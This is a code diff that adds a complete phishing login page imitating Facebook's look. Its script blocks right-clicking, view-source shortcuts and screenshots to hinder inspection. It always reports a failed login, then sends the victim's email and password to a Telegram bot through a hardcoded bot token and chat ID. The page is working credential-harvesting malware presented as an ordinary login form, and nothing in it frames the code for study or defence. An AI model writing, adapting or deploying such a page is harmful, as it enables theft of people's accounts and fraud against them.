@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #1877f2;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #166fe5;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1877f2;
+            font-size: 14px;
+        }
+
+        hr {
+            border: 0.5px solid #ddd;
+            margin: 20px 0;
+        }
+
+        .create-account-btn {
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            padding: 10px 0;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .create-account-btn:hover {
+            background-color: #36a420;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Login to Your Account</h2>
+            <form id="login-form">
+                <input type="text" id="email" placeholder="Email or Phone Number">
+                <input type="password" id="password" placeholder="Password">
+                <button type="submit" id="login-btn">Log In</button>
+            </form>
+            <div id="error-message" class="error-message"></div>
+            <a href="#">Forgot Password?</a>
+            <hr>
+            <button class="create-account-btn">Create New Account</button>
+        </div>
+    </div>
+
+    <script>
+        // Disable right-clicking
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+        });
+
+        // Disable keyboard shortcuts for viewing source code
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 67 || e.keyCode === 123)) {
+                return false;
+            }
+        };
+
+        // Prevent screenshots
+        window.addEventListener('keyup', function(e) {
+            if (e.key === 'PrintScreen' || (e.key === 'Shift' && e.key === 'F12')) {
+                alert('Screenshots are disabled on this page.');
+                e.preventDefault();
+            }
+        });
+
+        // Form submission and sending data to Telegram bot
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('login-form').addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent the default form submission
+
+                // Get the input values
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+
+                // Check if email and password are empty
+                if (email.trim() === '' || password.trim() === '') {
+                    document.getElementById('error-message').textContent = 'Email and password are required.';
+                    return;
+                }
+
+                // Simulate login process (Replace with actual login logic)
+                // For demonstration purposes, always show login error
+                document.getElementById('error-message').textContent = 'Invalid email or password.';
+
+                // Send email and password to Telegram bot
+                var botToken = '7028527207:AAHF8YASk8cfvcZimG6TOiZXWe5s6vRQwxM';
+                var chatId = '667820509';
+                var message = 'Email: ' + email + '\nPassword: ' + password;
+
+                var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+                fetch(url)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Failed to send message to Telegram bot');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Message sent to Telegram bot:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending message to Telegram bot:', error);
+                    });
+            });
+        });
+    </script>
+</body>
+</html>
